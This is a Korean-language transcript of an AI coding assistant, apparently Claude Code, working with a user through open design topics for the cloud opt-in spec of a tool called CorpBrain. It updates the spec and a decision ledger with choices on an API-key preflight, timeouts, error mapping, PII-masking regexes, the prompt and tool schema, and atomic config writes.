  [권장] A) — 비용 없이 프리플라이트 가능하고, v0.3이 이미 확립한 "환경/인증을
  자원 처리보다 먼저 확정한다"는 fail-fast 관례와 그대로 정합된다.

● User answered Claude's questions:
  ⎿  · T2. 파일 처리 전 API 키 유효성(401)을 어떻게 미리 검증할까? → GET 
     /v1/models 프리플라이트 (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 5 lines
      149  - 코드 구조: `Summarizer` 공통 인터페이스(프로토콜)를 먼저 정
           의하고 `OllamaSummarizer`·
      150    `AnthropicSummarizer` 두 구현체를 둔다. `pipeline.py`가 `con
           fig.engine` 값으로 둘 중 하나를
      151    선택해 호출한다(복수 provider 지원은 비목표이므로 구현체는 
           지금은 이 둘뿐이다). [제안 후 승인]
      152 +- **인증 프리플라이트** [제안 후 승인]: `engine=cloud`일 때 파
          +일 루프 진입 전                                               
      153 +  `GET https://api.anthropic.com/v1/models`를 1회 호출해 `ANTH
          +ROPIC_API_KEY` 유효성과                                       
      154 +  연결성을 확인한다(토큰 비용 없음). 이 호출이 401을 반환하면 
          +파일을 하나도 처리하지 않고                                   
      155 +  즉시 선행조건 실패로 종료한다(§3 항목 4). 기존 v0.3의 Ollama
          + 모델 존재 확인(`/api/tags`)과                                
      156 +  같은 자리 — "환경/인증을 자원 처리보다 먼저 확정한다"는 fail
          +-fast 관례를 그대로 따른다.                                   
      157  
      158  ### 4.4 NetworkGuard [사용자 결정]
      159  - allowlist는 하드코딩 단일 호스트 `api.anthropic.com`이며 CLI
           로 override할 수 없다.

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 1 / TOTAL: 8                                         
       8 +RESOLVED: 2 / TOTAL: 8                                         
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11 -- [ ] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처 
         -리 전 키 검증) | depends:T1 | status:UNRESOLVED                
      11 +- [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처 
         +리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
         +ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉 
         +시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
         +pbrain-v0.5-cloud-opt-in.md §4.3                               
      12  - [ ] T3 | MINOR | cloud 호출 timeout 기본값 | depends:T2 | sta
          tus:UNRESOLVED
      13  - [ ] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | dep
          ends:T2 | status:UNRESOLVED
      14  - [ ] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | depends:- 
           | status:UNRESOLVED

● [반영 완료] T2 → decision: 파일 루프 진입 전 GET /v1/models 1회
  프리플라이트(토큰 비용 없음), 401이면 0건 처리 후 즉시 exit 1
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §4.3 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 2 / TOTAL 8)

  ---

  [진척] RESOLVED 2 / TOTAL 8 · 현재 토픽: T3 cloud 호출 timeout 기본값

  스펙 어디에도 cloud 요청(프리플라이트·요약 호출)의 타임아웃 값이 없다. 기존
  로컬 경로는 DEFAULT_TIMEOUT=60.0을 여러 모듈이 공유해 재사용한다.

  [선택지]
  - A) 프리플라이트·요약 호출 모두 기존 DEFAULT_TIMEOUT(60초) 그대로 재사용 —
    별도 상수 없이 최소 변경 (추천)
  - B) 프리플라이트는 짧게(10초), 요약 호출은 60초로 분리 — 프리플라이트 실패를
    더 빨리 감지하지만 상수가 하나 늘어남
  - C) 요약 호출만 120초로 늘림 — 클라우드 응답 지연 대비하지만 이번
    슬라이스에서 실측 근거 없음

  [권장] A) — MINOR 토픽이고 기존 코드베이스가 이미 이 상수를 모듈 간 공유해온
  관례(불필요한 신규 상수·조기 최적화 지양)와 맞는다.

● User answered Claude's questions:
  ⎿  · T3. cloud 프리플라이트/요약 호출의 timeout 기본값은? → 기존 
     DEFAULT_TIMEOUT(60초) 재사용 (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 3 lines
      154    연결성을 확인한다(토큰 비용 없음). 이 호출이 401을 반환하면 
           파일을 하나도 처리하지 않고
      155    즉시 선행조건 실패로 종료한다(§3 항목 4). 기존 v0.3의 Ollama
            모델 존재 확인(`/api/tags`)과
      156    같은 자리 — "환경/인증을 자원 처리보다 먼저 확정한다"는 fail
           -fast 관례를 그대로 따른다.
      157 +- **타임아웃**: 프리플라이트·요약 호출 모두 기존 `DEFAULT_TIME
          +OUT`(60초, `ollama_client`/                                   
      158 +  `summarize`/`embed`가 공유하는 상수)를 그대로 재사용한다. cl
          +oud 전용 신규 타임아웃 상수는                                 
      159 +  두지 않는다. [제안 후 승인]                                 
      160  
      161  ### 4.4 NetworkGuard [사용자 결정]
      162  - allowlist는 하드코딩 단일 호스트 `api.anthropic.com`이며 CLI
           로 override할 수 없다.
● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 2 / TOTAL: 8                                         
       8 +RESOLVED: 3 / TOTAL: 8                                         
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11  - [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
          ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉
          시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
          pbrain-v0.5-cloud-opt-in.md §4.3
      12 -- [ ] T3 | MINOR | cloud 호출 timeout 기본값 | depends:T2 | sta
         -tus:UNRESOLVED                                                 
      12 +- [x] T3 | MINOR | cloud 호출 timeout 기본값 | status:RESOLVED 
         +| decision:기존 DEFAULT_TIMEOUT(60초) 그대로 재사용, 신규 상수 
         +없음 | applied:corpbrain-v0.5-cloud-opt-in.md §4.3             
      13  - [ ] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | dep
          ends:T2 | status:UNRESOLVED
      14  - [ ] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | depends:- 
           | status:UNRESOLVED
      15  - [ ] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | d
          epends:T5 | status:UNRESOLVED

● [반영 완료] T3 → decision: 기존 DEFAULT_TIMEOUT(60초) 재사용, 신규 상수 없음
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §4.3 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 3 / TOTAL 8)

  ---

  [진척] RESOLVED 3 / TOTAL 8 · 현재 토픽: T4 429/5xx/timeout → SkipReason 매핑
  규칙

  스펙 §3 항목8에 cloud_rate_limited/cloud_api_error 두 사유가 이름만 나와 있고,
  정확히 어떤 HTTP 상태코드 구간이 어느 사유로 떨어지는지, 400/404(예: 잘못된
  --cloud-model 모델명 — Anthropic은 Ollama처럼 pull 개념이 없어
  프리플라이트에서 걸러지지 않고 첫 요약 호출에서만 드러난다) 같은 애매한 경계가
  비어 있다.

  [선택지]
  - A) 429만 cloud_rate_limited, 나머지 전부(5xx·타임아웃·연결오류·400/404 등)는
    cloud_api_error로 통합 — 2개 사유만 유지, 스펙 문구 변경 없음 (추천)
  - B) 429→cloud_rate_limited, 5xx→cloud_server_error,
    타임아웃→cloud_timeout으로 3종 세분화 — 더 정밀한 리포트지만 SkipReason
    항목이 늘고 스펙 §3 문구 수정 필요
  - C) 400/404(모델명 오류 등 요청 자체 결함)는 재시도해도 성공 못 하는 구조적
    오류이므로 파일 스킵이 아니라 첫 발생 시 선행조건 실패로 승격 — 사용자에게
    더 빨리 알리지만 "부분 성공" 철학과 배치되고 구현 분기가 늘어남

  [권장] A) — 스펙이 이미 명명한 두 사유 그대로 유지해 문서 정합성이 깨지지
  않고, 어차피 사용자가 볼 스킵 리포트에는 파일명+사유가 같이 나오므로 세분화의
  실익이 적다.

● User answered Claude's questions:
  ⎿  · T4. 429/5xx/timeout/400·404 등을 SkipReason 두 가지에 어떻게 매핑할까? → 
     429만 rate_limited, 나머지는 전부 api_error (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 5 lines, removed 1 line
      62       시나리오로 확장해 각각 검증.
      63  8. 개별 파일 처리 중 레이트리밋(429) 또는 일시적 오류(5xx·타임
          아웃)가 발생하면, 재시도 없이
      64     해당 파일만 신규 스킵 사유(`cloud_rate_limited` 또는 `cloud_
          api_error`)로 스킵 리포트에
      65 -   남기고 나머지 파일은 계속 처리하며, 전체 종료 코드는 **0**( 
         -부분 성공)이다.                                                
      65 +   남기고 나머지 파일은 계속 처리하며, 전체 종료 코드는 **0**( 
         +부분 성공)이다. **매핑 규칙**                                  
      66 +   [제안 후 승인]: HTTP 429만 `cloud_rate_limited`. 그 외 모든 
         +실패(5xx, 타임아웃, 연결오류,                                  
      67 +   400·404 등 요청 자체 결함 포함)는 `cloud_api_error`로 통합한
         +다 — 신규 SkipReason은 이                                      
      68 +   두 값뿐이며, 프리플라이트(§4.3)를 통과한 뒤 개별 파일에서 발
         +생하는 어떤 실패도 이 두                                       
      69 +   사유 중 하나로 수렴한다(전체 실행을 중단시키지 않는다).     
      70     - 검증: 통합테스트 — 특정 파일에서만 429/5xx/timeout이 나도
          록 mock, 해당 파일 스킵 사유·
      71       타 파일 정상 생성·exit 0 확인.
      72  9. 같은 폴더를 `--engine local`로 스캔한 뒤 원문 변경 없이 `--e
          ngine cloud`로 재스캔하면(또는

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 3 / TOTAL: 8                                         
       8 +RESOLVED: 4 / TOTAL: 8                                         
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11  - [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
          ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉
          시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
          pbrain-v0.5-cloud-opt-in.md §4.3
      12  - [x] T3 | MINOR | cloud 호출 timeout 기본값 | status:RESOLVED 
          | decision:기존 DEFAULT_TIMEOUT(60초) 그대로 재사용, 신규 상수 
          없음 | applied:corpbrain-v0.5-cloud-opt-in.md §4.3
      13 -- [ ] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | dep
         -ends:T2 | status:UNRESOLVED                                    
      13 +- [x] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | sta
         +tus:RESOLVED | decision:429만 cloud_rate_limited, 그 외(5xx·타 
         +임아웃·연결오류·400/404 포함) 전부 cloud_api_error로 통합, 신규
         + 사유 2개뿐 | applied:corpbrain-v0.5-cloud-opt-in.md §3 항목8  
      14  - [ ] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | depends:- 
           | status:UNRESOLVED
      15  - [ ] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | d
          epends:T5 | status:UNRESOLVED
      16  - [ ] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | 
          depends:-  | status:UNRESOLVED

● [반영 완료] T4 → decision: 429만 cloud_rate_limited, 나머지 전부
  cloud_api_error
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §3 항목8 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 4 / TOTAL 8)

  ---

  [진척] RESOLVED 4 / TOTAL 8 · 현재 토픽: T5 PII 탐지 정규식 7종의 실제 패턴

  스펙은 "주민등록번호·전화번호·이메일·사업자등록번호·카드번호·계좌번호·IP주소"
  7종을 이름만 나열했다. 실제 정규식(체크섬 검증 포함 여부)이 없으면 구현자가
  임의로 정밀도를 정하게 되는데, 이건 보안 기능이라 오탐/누락 방향이 결과에 직접
  영향을 준다.

  [선택지]
  - A) 형태 기반 느슨한 매칭 — 체크섬·Luhn 검증 없이 자릿수·구분자 패턴만
    확인(예: RRN=\d{6}-\d{7}, 카드=16자리 4그룹). 놓치는 경우(false negative)를
    최소화하는 방향으로 기운다 — 과탐(정상 숫자열을 마스킹)은 안전하지만 놓치는
    건 유출이다 (추천)
  - B) 체크섬/검증 알고리즘 포함 엄격 매칭 — RRN 뒷자리 체크섬, 카드번호 Luhn
    검증 등. 오탐은 줄지만 구현이 복잡해지고, 검증 로직 자체의 버그가 실제 PII를
    놓칠 위험이 생긴다(보안 목적과 역행 가능)

  [권장] A) — 이미 "ML 기반 PII 탐지는 비목표, 정규식 기반만"으로 정해둔 방향과
  일치하고, 마스킹 대상이 원본 위키가 아니라 클라우드로 나가는 전송본이라 과탐
  비용이 낮다(형식이 우연히 비슷한 일반 숫자열이 가끔 마스킹될 뿐 위키 품질에는
  영향 없음).

● User answered Claude's questions:
  ⎿  · T5. PII 7종 정규식의 정밀도 원칙을 어느 쪽으로 잡을까? → 형태 기반 느슨한
     매칭 (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 16 lines, removed 2 lines
      178  
      179  ### 4.5 PII 마스킹 [사용자 결정]
      180  - 신규 모듈(예: `corpbrain/core/pii.py`)이 정규식 기반 탐지·마
           스킹을 담당한다.
      181 -- 탐지 패턴 7종(한국 특화): 주민등록번호, 전화번호, 이메일, 사
          -업자등록번호, 신용카드번호,                                   
      182 -  계좌번호, IP주소.                                           
      181 +- **정밀도 원칙** [사용자 결정]: 체크섬·Luhn 등 검증 알고리즘 
          +없이 **형태(자릿수·구분자) 기반                               
      182 +  느슨한 매칭**만 쓴다. 과탐(정상 숫자열을 마스킹)은 감수하되 
          +누락(실제 PII를 놓침)을                                       
      183 +  최소화하는 방향으로 기운다 — 마스킹 대상은 클라우드로 나가는
          + 전송본일 뿐 원본 위키에는                                    
      184 +  영향을 주지 않으므로 과탐 비용이 낮다.                      
      185 +- **패턴 7종 정의** [제안 후 승인]:                           
      186 +                                                              
      187 +  | 유형 | 정규식(형태) | 비고 |                              
      188 +  |------|--------------|------|                              
      189 +  | 주민등록번호 | `\b\d{6}-?[1-8]\d{6}\b` | 하이픈 유무 모두 
          +허용, 뒷자리 첫 숫자 1~8(성별·내외국인 코드 범위)로 과탐 일부 
          +제한. 체크섬 미검증. |                                        
      190 +  | 전화번호 | `\b01[016789]-?\d{3,4}-?\d{4}\b` (휴대전화) 및 
          +`\b0(2\|[3-6]\d)-?\d{3,4}-?\d{4}\b` (일반전화) | 두 패턴을 OR 
          +로 결합. |                                                    
      191 +  | 이메일 | `\b[\w.+-]+@[\w-]+\.[A-Za-z]{2,}\b` | 표준적인 이
          +메일 형태 매칭. |                                             
      192 +  | 사업자등록번호 | `\b\d{3}-\d{2}-\d{5}\b` | 하이픈 포함 표 
          +준 표기만(3-2-5). |                                           
      193 +  | 신용카드번호 | `\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b` |
          + 16자리 4그룹(국내 대다수 카드). 15자리(Amex 등)는 비목표. |  
      194 +  | 계좌번호 | `\b\d{2,6}-\d{2,6}-\d{2,6}(-\d{1,6})?\b` | 국내
          + 은행별 표준 포맷이 없어 휴리스틱(하이픈 2~3개로 구분된 숫자  
          +그룹)이다 — 7종 중 오탐률이 가장 높을 수 있음을 인지하고 채택 
          +한다. |                                                       
      195 +  | IP주소 | `\b(?:\d{1,3}\.){3}\d{1,3}\b` | IPv4만. 옥텟 범위
          +(0~255) 미검증(형태만). IPv6은 비목표. |                      
      196 +                                                              
      197  - `engine=cloud`로 요약을 요청하기 직전, 프롬프트에 들어갈 원
           문 텍스트에 대해 7종을 모두
      198    탐지해 각각 `[REDACTED_<TYPE>]` 형태의 플레이스홀더로 치환한
            뒤 전송한다. 치환 개수는
      199    파일별로 진행 로그/요약 리포트에 표시한다(차단하지 않는다 — 
           §3 항목 6).

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 4 / TOTAL: 8                                         
       8 +RESOLVED: 5 / TOTAL: 8                                         
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11  - [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
          ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉
          시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
          pbrain-v0.5-cloud-opt-in.md §4.3
      12  - [x] T3 | MINOR | cloud 호출 timeout 기본값 | status:RESOLVED 
          | decision:기존 DEFAULT_TIMEOUT(60초) 그대로 재사용, 신규 상수 
          없음 | applied:corpbrain-v0.5-cloud-opt-in.md §4.3
      13  - [x] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | sta
          tus:RESOLVED | decision:429만 cloud_rate_limited, 그 외(5xx·타
          임아웃·연결오류·400/404 포함) 전부 cloud_api_error로 통합, 신규
           사유 2개뿐 | applied:corpbrain-v0.5-cloud-opt-in.md §3 항목8
      14 -- [ ] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | depends:- 
         - | status:UNRESOLVED                                           
      14 +- [x] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | status:RES
         +OLVED | decision:체크섬 없는 형태 기반 느슨한 매칭 원칙 채택, 7
         +종 각각 구체 정규식 확정(계좌번호는 은행별 표준 부재로 휴리스틱
         +임을 명시) | applied:corpbrain-v0.5-cloud-opt-in.md §4.5       
      15  - [ ] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | d
          epends:T5 | status:UNRESOLVED
      16  - [ ] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | 
          depends:-  | status:UNRESOLVED
      17  - [ ] T8 | MINOR | doctor/consent 명령 출력 문구 포맷 | depends
          :-  | status:UNRESOLVED

● [반영 완료] T5 → decision: 체크섬 없는 형태 기반 느슨한 매칭, 7종 정규식
  확정(계좌번호는 명시적 휴리스틱)
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §4.5 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 5 / TOTAL 8)

  ---

  [진척] RESOLVED 5 / TOTAL 8 · 현재 토픽: T6 Anthropic 요청 프롬프트·tool
  스키마 상세

  §4.3은 "tool use로 스키마 강제"라고만 적혀 있고, 실제 system prompt 문구와
  tool 이름·스키마가 비어 있다. (key_points 개수 제약 등은 이미 §4.3에서 "기존
  parse_summary()와 동일 검증"으로 정해져 있어, tool 스키마에 별도
  minItems/maxItems를 추가하지 않는 것으로 자동 정합된다 — 이 부분은 새 질문이
  필요 없다.)

  [선택지]
  - A) 기존 Ollama PROMPT_TEMPLATE의 지침 문구(한국어 요약 요구, 5필드 의미
    설명)를 그대로 system prompt로 재사용하고, "JSON으로만 응답하라" 같은 포맷
    강제 문구만 제거(tool_choice가 대신함) — 프롬프트 두 벌 유지 비용 최소화,
    로컬·클라우드 출력 톤이 일관됨 (추천)
  - B) Anthropic tool-use 문맥에 맞춰 완전히 새로 작성 — 더 최적화 여지가 있지만
    두 프롬프트를 별도로 유지·검증해야 함

  [권장] A) — MVP 스펙이 이미 확정한 5필드 의미·한국어 출력 요구는 provider와
  무관한 제품 결정이므로, 프롬프트 실체를 하나만 두고 강제 메커니즘(JSON
  프롬프트 vs tool_choice)만 provider별로 다르게 얹는 게 유지보수에 유리하다.

● User answered Claude's questions:
  ⎿  · T6. Anthropic 요청의 system prompt 내용은 어떻게 작성할까? → 기존 
     PROMPT_TEMPLATE 재사용 (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 7 lines
      146  - JSON 5필드(`title`/`one_line_summary`/`key_points`/`summary`
           /`tags`) 강제는 Anthropic tool
      147    use(function calling)로 스키마를 강제한다(`tool_choice`로 도
           구 호출을 강제) — Ollama의
      148    `format: "json"` 프롬프트 기반 방식보다 파싱 실패율이 낮다. 
           [제안 후 승인]
      149 +- **프롬프트·tool 스키마** [제안 후 승인]: system prompt는 MVP
          + 스펙 §4.3의 기존                                             
      150 +  `PROMPT_TEMPLATE`(한국어 요약 지침, 5필드 의미 설명)을 그대 
          +로 재사용하되, "JSON으로만                                    
      151 +  응답하라" 류의 포맷 강제 문구는 제거한다(강제는 `tool_choice
          +`가 대신 담당). tool 이름은                                   
      152 +  `emit_summary`, `input_schema`는 5필드를 모두 `required`로  
          +두되 `key_points`/`tags`의                                    
      153 +  `minItems`/`maxItems`는 지정하지 않는다(기존 `parse_summary(
          +)`와 동일하게 "비어있지 않은                                  
      154 +  문자열 배열"만 검증해 로컬·클라우드 검증 규칙을 일치시킨다).
          + `max_tokens`는 2048로 고정한다                               
      155 +  (`--max-chars` 12000자 입력 대비 요약 출력에 충분한 여유).  
      156  - 응답 검증 규칙은 기존 `parse_summary()`(MVP 스펙 §4.3)와 동
           일하게 5필드 필수·문자열 필드
      157    공백 불허·리스트 필드는 문자열 배열만 허용한다. 검증 실패는 
           기존과 동일하게 해당 파일만
      158    스킵 처리된다(§3 항목 8과 별개로, JSON 스키마 자체 파싱 실패
           는 기존 `LLMParseError` 계열로

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 5 / TOTAL: 8                                         
       8 +RESOLVED: 6 / TOTAL: 8                                         
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11  - [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
          ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉
          시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
          pbrain-v0.5-cloud-opt-in.md §4.3
      12  - [x] T3 | MINOR | cloud 호출 timeout 기본값 | status:RESOLVED 
          | decision:기존 DEFAULT_TIMEOUT(60초) 그대로 재사용, 신규 상수 
          없음 | applied:corpbrain-v0.5-cloud-opt-in.md §4.3
      13  - [x] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | sta
          tus:RESOLVED | decision:429만 cloud_rate_limited, 그 외(5xx·타
          임아웃·연결오류·400/404 포함) 전부 cloud_api_error로 통합, 신규
           사유 2개뿐 | applied:corpbrain-v0.5-cloud-opt-in.md §3 항목8
      14  - [x] T5 | CORE  | PII 탐지 정규식 7종의 실제 패턴 | status:RES
          OLVED | decision:체크섬 없는 형태 기반 느슨한 매칭 원칙 채택, 7
          종 각각 구체 정규식 확정(계좌번호는 은행별 표준 부재로 휴리스틱
          임을 명시) | applied:corpbrain-v0.5-cloud-opt-in.md §4.5
      15 -- [ ] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | d
         -epends:T5 | status:UNRESOLVED                                  
      15 +- [x] T6 | CORE  | Anthropic 요청 프롬프트·tool 스키마 상세 | s
         +tatus:RESOLVED | decision:기존 PROMPT_TEMPLATE 재사용(JSON강제 
         +문구만 제거), tool명 emit_summary, minItems/maxItems 미지정으로
         + 로컬과 검증규칙 일치, max_tokens=2048 | applied:corpbrain-v0.5
         +-cloud-opt-in.md §4.3                                          
      16  - [ ] T7 | MINOR | 동의 설정파일 쓰기 방식(원자적 쓰기 여부) | 
          depends:-  | status:UNRESOLVED
      17  - [ ] T8 | MINOR | doctor/consent 명령 출력 문구 포맷 | depends
          :-  | status:UNRESOLVED

● [반영 완료] T6 → decision: 기존 프롬프트 재사용, tool명 emit_summary, 검증
  규칙 로컬과 일치, max_tokens=2048
  - 설계문서: corpbrain-v0.5-cloud-opt-in.md §4.3 갱신
  - 원장: GRILL_LEDGER-v0.5.md (RESOLVED 6 / TOTAL 8)

  ---

  [진척] RESOLVED 6 / TOTAL 8 · 현재 토픽: T7 동의 설정파일 쓰기 방식

  ~/.corpbrain/config.json에 쓰는 도중 프로세스가 죽으면(디스크 풀·강제종료 등)
  파일이 깨진 JSON으로 남아 이후 모든 doctor/scan --engine cloud 호출이 파싱
  에러로 죽을 위험이 있다. 이건 보안 상태를 담는 유일한 영속 파일이라 손상 시
  사용자가 원인을 알기 어렵다.

  [선택지]
  - A) 원자적 쓰기(임시 파일에 쓴 뒤 os.replace로 교체) — 표준 패턴, 코드 몇 줄
    추가로 손상 가능성을 사실상 제거 (추천)
  - B) 단순 open(path, "w") 직접 덮어쓰기 — 더 간단하지만 쓰기 도중 중단되면
    파일이 깨질 수 있음

  [권장] A) — 보안 관련 상태 파일이므로 손상 시 사용자가 consent cloud --grant를
  다시 해야 하는 것 이상으로 "왜 doctor가 깨지는지" 디버깅 비용이 크다. 구현
  비용은 낮다.

● User answered Claude's questions:
  ⎿  · T7. 동의 설정파일(~/.corpbrain/config.json) 쓰기는 어떻게 할까? → 원자적 
     쓰기(임시파일+os.replace) (추천)

● Update(static\docs\specs\features\corpbrain-v0.5-cloud-opt-in.md)
  ⎿  Added 3 lines
      135  - `consent cloud --revoke`는 `cloud_consent.anthropic.granted`
           를 `false`로 남기거나 키 자체를
      136    제거한다(둘 중 무엇이든 이후 `granted`가 `true`가 아니면 동
           의 없음으로 취급).
      137  - API 키는 이 파일에 절대 쓰지 않는다.
      138 +- **쓰기 방식** [제안 후 승인]: 원자적 쓰기(임시 파일에 쓴 뒤 
          +`os.replace`로 교체)를 사용한다.                              
      139 +  보안 상태를 담는 유일한 영속 파일이므로, 쓰기 도중 중단되어 
          +도 기존 파일이 깨진 JSON으로                                  
      140 +  남지 않도록 한다.                                           
      141  
      142  ### 4.3 요약 호출 구현 [사용자 결정]
      143  - Anthropic 공식 SDK를 사용하지 않는다. `gateway.request_json(
           )`에 `headers: dict[str, str] |

● Update(docs\grill\GRILL_LEDGER-v0.5.md)
  ⎿  Added 2 lines, removed 2 lines
       5  완료조건: 아래 토픽 전부 RESOLVED
       6  OUTPUT: `static/docs/specs/features/corpbrain-v0.5-cloud-opt-in
          .md`, 필요 시 `CLAUDE.md`
       7  
       8 -RESOLVED: 6 / TOTAL: 8                                         
       8 +RESOLVED: 7 / TOTAL: 8                                         
       9  
      10  - [x] T1 | CORE  | NetworkGuard 호스트 매칭 로직(스킴·포트·리다
          이렉트 판정) | status:RESOLVED | decision:urlsplit(scheme,hostn
          ame) 대소문자무시 정확일치 + 커스텀 HTTPRedirectHandler로 3xx 
          무조건 예외, stdlib만 사용 | applied:corpbrain-v0.5-cloud-opt-i
          n.md §4.4
      11  - [x] T2 | CORE  | Cloud 인증 프리플라이트 메커니즘(첫 파일 처
          리 전 키 검증) | status:RESOLVED | decision:파일 루프 진입 전 G
          ET /v1/models 1회 호출(토큰 비용 없음), 401이면 0건 처리 후 즉
          시 exit 1, v0.3 Ollama 프리플라이트와 동일한 자리 | applied:cor
          pbrain-v0.5-cloud-opt-in.md §4.3
     ...
      13  - [x] T4 | CORE  | 429/5xx/timeout → SkipReason 매핑 규칙 | sta
          tus:RESOLVED | decision:429만 cloud_rate_limited, 그 외(5xx·타
          임아웃·연결오류·400/404 포함) 전부 cloud_api_error로 통합, 신규
           사유 2개뿐 | applied:corpbrain-v0.5-cloud-opt-in.md §3 항목8
